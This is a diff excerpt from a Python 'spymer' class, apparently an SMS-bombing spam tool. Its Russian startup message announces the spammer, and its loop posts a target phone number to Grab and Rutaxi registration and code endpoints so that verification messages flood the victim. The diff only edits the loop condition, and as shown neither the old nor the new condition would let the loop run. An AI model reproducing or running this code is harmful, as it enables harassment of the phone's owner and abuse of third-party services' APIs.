@@ -56,7 +56,7 @@ class spymer:
 		print('Спамер запущен.\nЕсли Вы хотите остановить - нажмите Ctrl+Z.')
 		i = 10
 		iteration = 1000
-		while i < 1:
+		while i > 100:
 			_email = _name+f'{iteration}'+'@gmail.com'
 			grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'})
 			rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
